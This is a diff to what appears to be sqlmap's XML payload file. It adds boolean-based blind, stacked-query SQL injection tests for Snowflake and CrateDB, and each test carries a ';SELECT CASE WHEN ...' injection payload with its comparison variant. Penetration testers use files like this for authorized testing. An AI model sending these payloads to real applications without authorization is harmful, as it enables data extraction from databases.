@@ -1608,5 +1608,47 @@ Tag: <test>
             <dbms>SAP MaxDB</dbms>
         </details>
     </test>
+    <!-- Snowflake boolean-based blind - Stacked queries -->
+    <test>
+        <title>Snowflake boolean-based blind - Stacked queries</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1-8</clause>
+        <where>1</where>
+        <vector>;SELECT CASE WHEN [INFERENCE] THEN 1 ELSE 0 END</vector>
+        <request>
+            <payload>;SELECT CASE WHEN [RANDNUM]=[RANDNUM] THEN 1 ELSE 0 END</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <comparison>;SELECT CASE WHEN [RANDNUM]=[RANDNUM1] THEN 1 ELSE 0 END</comparison>
+        </response>
+        <details>
+            <dbms>Snowflake</dbms>
+        </details>
+    </test>
+
+    <!-- CrateDB boolean-based blind - Stacked queries -->
+    <test>
+        <title>CrateDB boolean-based blind - Stacked queries</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1-8</clause>
+        <where>1</where>
+        <vector>;SELECT CASE WHEN [INFERENCE] THEN 1 ELSE 0 END</vector>
+        <request>
+            <payload>;SELECT CASE WHEN [RANDNUM]=[RANDNUM] THEN 1 ELSE 0 END</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <comparison>;SELECT CASE WHEN [RANDNUM]=[RANDNUM1] THEN 1 ELSE 0 END</comparison>
+        </response>
+        <details>
+            <dbms>CrateDB</dbms>
+        </details>
+    </test>
+
     <!-- End of boolean-based blind tests - Stacked queries -->
 </root>
